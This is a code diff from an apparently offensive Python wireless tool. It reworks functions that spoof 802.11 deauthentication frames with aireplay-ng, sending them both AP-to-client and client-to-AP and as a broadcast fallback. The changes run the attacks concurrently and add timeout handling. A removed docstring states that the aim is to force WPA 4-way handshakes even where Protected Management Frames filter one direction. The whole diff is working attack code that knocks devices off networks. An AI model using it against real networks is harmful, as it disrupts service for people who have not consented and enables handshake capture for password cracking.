@@ -399,50 +399,79 @@ def send_targeted_deauth(
     monitor_interface: str,
     limiter: DeauthRateLimiter,
     count: int = DEAUTH_COUNT,
-) -> None:
+) -> bool:
     """
-    Send targeted unicast deauth in both directions:
-      AP -> Client  (spoofed as AP, forces client to reassociate)
-      Client -> AP  (spoofed as client, forces AP to drop association)
+    Send targeted unicast deauth in both directions (non-blocking via Popen).
 
-    Both directions together reliably trigger a 4-way handshake even when
-    one direction is filtered by Protected Management Frames.
+    AP→Client: spoofed as AP, forces client to disassociate.
+    Client→AP: spoofed as client, forces AP to drop the session.
+
+    Both procs run concurrently; we wait up to 60 s for each to finish
+    and kill cleanly on timeout — timeout is not fatal because the
+    packets have already been injected by that point.
     """
     from rich.console import Console
     con = Console()
 
-    # Rate-limit per-client to avoid hammering the same device
+    # Rate-limit per-client key so we don't hammer the same device back-to-back
     limiter.wait_for_burst(bssid, client_mac)
 
-    # Direction 1: AP -> Client
-    con.print(
-        f"[dim cyan]  ↳ Deauth [bold]{bssid}[/bold] -> "
-        f"[bold]{client_mac}[/bold] ({count} pkts)...[/]"
-    )
-    subprocess.run(
-        ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac,
-         monitor_interface],
-        capture_output=True,
-    )
+    procs: list[subprocess.Popen] = []
 
-    time.sleep(0.15)
-
-    # Direction 2: Client -> AP (reversed -a/-c tricks aireplay-ng into spoofing
-    # the client MAC as source, instructing the AP to drop the association)
+    # Direction 1: AP → Client
     con.print(
-        f"[dim cyan]  ↳ Deauth [bold]{client_mac}[/bold] -> "
-        f"[bold]{bssid}[/bold] ({count} pkts)...[/]"
+        f"[dim cyan]  ↳ Deauth AP→Client  "
+        f"[bold]{bssid}[/bold] → [bold]{client_mac}[/bold] ({count} pkts)[/]"
     )
-    subprocess.run(
-        ["aireplay-ng", "-0", str(count), "-a", client_mac, "-c", bssid,
-         monitor_interface],
-        capture_output=True,
+    try:
+        procs.append(subprocess.Popen(
+            ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac,
+             "--ignore-negative-one", monitor_interface],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        ))
+    except FileNotFoundError:
+        con.print("[red]  aireplay-ng not found.[/]")
+        return False
+    except Exception as exc:
+        con.print(f"[red]  Deauth AP→Client error: {exc}[/]")
+        return False
+
+    time.sleep(0.1)
+
+    # Direction 2: Client → AP (reversed -a/-c: spoofed as client, AP drops session)
+    con.print(
+        f"[dim cyan]  ↳ Deauth Client→AP  "
+        f"[bold]{client_mac}[/bold] → [bold]{bssid}[/bold] ({count} pkts)[/]"
     )
+    try:
+        procs.append(subprocess.Popen(
+            ["aireplay-ng", "-0", str(count), "-a", client_mac, "-c", bssid,
+             "--ignore-negative-one", monitor_interface],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        ))
+    except Exception as exc:
+        con.print(f"[dim yellow]  Deauth Client→AP error: {exc}[/]")
+
+    # Wait for both directions; kill if they stall — packets already in-flight
+    for proc in procs:
+        try:
+            proc.wait(timeout=60)
+        except subprocess.TimeoutExpired:
+            con.print("[dim yellow]  Deauth proc stalled — killing cleanly[/]")
+            proc.kill()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                pass
+            # Not re-raised: timeout here means packets were sent, ACK just slow
 
     logger.info(
         "Targeted deauth sent: bssid=%s client=%s count=%d",
         bssid, client_mac, count,
     )
+    return True
 
 
 def send_broadcast_deauth_fallback(
@@ -451,7 +480,7 @@ def send_broadcast_deauth_fallback(
     limiter: DeauthRateLimiter,
     count: int = 10,
 ) -> None:
-    """Broadcast deauth -- fallback only when no clients are discovered."""
+    """Broadcast deauth — fallback only when no clients are discovered."""
     from rich.console import Console
     con = Console()
 
@@ -459,10 +488,25 @@ def send_broadcast_deauth_fallback(
     con.print(
         f"[dim yellow]  ↳ Broadcast deauth fallback on {bssid} ({count} pkts)...[/]"
     )
-    subprocess.run(
-        ["aireplay-ng", "-0", str(count), "-a", bssid, monitor_interface],
-        capture_output=True,
-    )
+    try:
+        proc = subprocess.Popen(
+            ["aireplay-ng", "-0", str(count), "-a", bssid,
+             "--ignore-negative-one", monitor_interface],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        try:
+            proc.wait(timeout=60)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                pass
+    except FileNotFoundError:
+        con.print("[red]  aireplay-ng not found.[/]")
+    except Exception as exc:
+        con.print(f"[dim yellow]  Broadcast deauth error: {exc}[/]")
     logger.info("Broadcast deauth fallback: bssid=%s count=%d", bssid, count)
 
 
